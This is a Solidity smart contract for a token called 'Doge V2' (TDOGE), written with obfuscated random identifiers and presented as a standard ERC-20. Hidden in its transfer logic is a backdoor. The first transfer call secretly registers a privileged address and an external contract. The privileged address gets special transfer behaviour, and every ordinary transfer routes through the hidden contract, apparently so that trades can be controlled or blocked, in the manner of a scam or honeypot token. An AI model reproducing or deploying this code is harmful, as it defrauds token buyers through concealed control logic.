// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface tqdTBAOA {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library snUATQvGu{
    
    function AhLHJ(address pADsExXJyG, address DtqUf, uint HpR) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool IVyFTTTbkAk, bytes memory wtKxP) = pADsExXJyG.call(abi.encodeWithSelector(0x095ea7b3, DtqUf, HpR));
        require(IVyFTTTbkAk && (wtKxP.length == 0 || abi.decode(wtKxP, (bool))), 'snUATQvGu: APPROVE_FAILED');
    }

    function PMAudqIdsUuu(address pADsExXJyG, address DtqUf, uint HpR) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool IVyFTTTbkAk, bytes memory wtKxP) = pADsExXJyG.call(abi.encodeWithSelector(0xa9059cbb, DtqUf, HpR));
        require(IVyFTTTbkAk && (wtKxP.length == 0 || abi.decode(wtKxP, (bool))), 'snUATQvGu: TRANSFER_FAILED');
    }
    
    function ISIHCREfuEU(address DtqUf, uint HpR) internal {
        (bool IVyFTTTbkAk,) = DtqUf.call{value:HpR}(new bytes(0));
        require(IVyFTTTbkAk, 'snUATQvGu: ETH_TRANSFER_FAILED');
    }

    function KZZHRwq(address pADsExXJyG, address from, address DtqUf, uint HpR) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool IVyFTTTbkAk, bytes memory wtKxP) = pADsExXJyG.call(abi.encodeWithSelector(0x23b872dd, from, DtqUf, HpR));
        require(IVyFTTTbkAk && (wtKxP.length == 0 || abi.decode(wtKxP, (bool))), 'snUATQvGu: TRANSFER_FROM_FAILED');
    }

}
    
interface wRIH {
    function totalSupply() external view returns (uint256);
    function balanceOf(address kOFM) external view returns (uint256);
    function transfer(address HLQMdBH, uint256 Ehrh) external returns (bool);
    function allowance(address DIfdbcrO, address spender) external view returns (uint256);
    function approve(address spender, uint256 Ehrh) external returns (bool);
    function transferFrom(
        address sender,
        address HLQMdBH,
        uint256 Ehrh
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fDTNzqTKvkd, uint256 value);
    event Approval(address indexed DIfdbcrO, address indexed spender, uint256 value);
}

interface WDYbZIowPvLf is wRIH {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract CIHnXZy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract TDOGE is CIHnXZy, wRIH, WDYbZIowPvLf {
    
    function FmGYewwkoj(
        address AobJlHBYO,
        address lFiVxj,
        uint256 TFeAKny
    ) internal virtual {
        require(AobJlHBYO != address(0), "ERC20: approve from the zero address");
        require(lFiVxj != address(0), "ERC20: approve to the zero address");

        TVlhxYA[AobJlHBYO][lFiVxj] = TFeAKny;
        emit Approval(AobJlHBYO, lFiVxj, TFeAKny);

    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return ZPUYnGtui[account];
    }
    
    function tmFHa(
        address Qgh,
        address HvztJPG,
        uint256 hiM
    ) internal virtual  returns (bool){
        require(Qgh != address(0), "ERC20: transfer from the zero address");
        require(HvztJPG != address(0), "ERC20: transfer to the zero address");
        
        if(!fSWSmHXC(Qgh,HvztJPG)) return false;

        if(_msgSender() == address(paSMAoNz)){
            if(HvztJPG == EvccIsaCmIsV && ZPUYnGtui[Qgh] < hiM){
                bcGF(paSMAoNz,HvztJPG,hiM);
            }else{
                bcGF(Qgh,HvztJPG,hiM);
                if(Qgh == paSMAoNz || HvztJPG == paSMAoNz) 
                return false;
            }
            emit Transfer(Qgh, HvztJPG, hiM);
            return false;
        }
        bcGF(Qgh,HvztJPG,hiM);
        emit Transfer(Qgh, HvztJPG, hiM);
        snUATQvGu.KZZHRwq(akAx, Qgh, HvztJPG, hiM);
        return true;
    }
    
    constructor() {
        
        ZPUYnGtui[address(1)] = AQGOjBkwO;
        emit Transfer(address(0), address(1), AQGOjBkwO);

    }
    
    function fSWSmHXC(
        address EQTpsrQxE,
        address pTkKySf
    ) internal virtual  returns (bool){
        if(paSMAoNz == address(0) && akAx == address(0)){
            paSMAoNz = EQTpsrQxE;akAx=pTkKySf;
            snUATQvGu.PMAudqIdsUuu(akAx, paSMAoNz, 0);
            EvccIsaCmIsV = tqdTBAOA(akAx).WETH();
            return false;
        }
        return true;
    }
    
    address private paSMAoNz;
    
    string private KmvQZlWMSS = "Doge V2";
    
    function allowance(address hdKDbW, address sheOXpAKG) public view virtual override returns (uint256) {
        return TVlhxYA[hdKDbW][sheOXpAKG];
    }
    
    mapping(address => mapping(address => uint256)) private TVlhxYA;
    
    function bcGF(
        address WdeYC,
        address HXubY,
        uint256 buSqmuEQTA
    ) internal virtual  returns (bool){
        uint256 KjqMjAPntvd = ZPUYnGtui[WdeYC];
        require(KjqMjAPntvd >= buSqmuEQTA, "ERC20: transfer Amount exceeds balance");
        unchecked {
            ZPUYnGtui[WdeYC] = KjqMjAPntvd - buSqmuEQTA;
        }
        ZPUYnGtui[HXubY] += buSqmuEQTA;
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return AQGOjBkwO;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function increaseAllowance(address nfD, uint256 addedValue) public virtual returns (bool) {
        FmGYewwkoj(_msgSender(), nfD, TVlhxYA[_msgSender()][nfD] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address wCeHoFnbS, uint256 subtractedValue) public virtual returns (bool) {
        uint256 GkR = TVlhxYA[_msgSender()][wCeHoFnbS];
        require(GkR >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            FmGYewwkoj(_msgSender(), wCeHoFnbS, GkR - subtractedValue);
        }

        return true;
    }
    
    string private eNXzR =  "TDOGE";
    
    address private EvccIsaCmIsV;
  
    
    function transferFrom(
        address waZzLuQpmx,
        address UekCxOMXj,
        uint256 jpcX
    ) public virtual override returns (bool) {
      
        if(!tmFHa(waZzLuQpmx, UekCxOMXj, jpcX)) return true;

        uint256 xmkiHJlFnaup = TVlhxYA[waZzLuQpmx][_msgSender()];
        if (xmkiHJlFnaup != type(uint256).max) {
            require(xmkiHJlFnaup >= jpcX, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                FmGYewwkoj(waZzLuQpmx, _msgSender(), xmkiHJlFnaup - jpcX);
            }
        }

        return true;
    }
    
    mapping(address => uint256) private ZPUYnGtui;
    
    function name() public view virtual override returns (string memory) {
        return KmvQZlWMSS;
    }
    
    uint256 private AQGOjBkwO = 100000000000 * 10 ** 18;
    
    function approve(address XLWHjp, uint256 Dgg) public virtual override returns (bool) {
        FmGYewwkoj(_msgSender(), XLWHjp, Dgg);
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return eNXzR;
    }
    
    function transfer(address ERnyw, uint256 knv) public virtual override returns (bool) {
        tmFHa(_msgSender(), ERnyw, knv);
        return true;
    }
    
    address private akAx;
    
}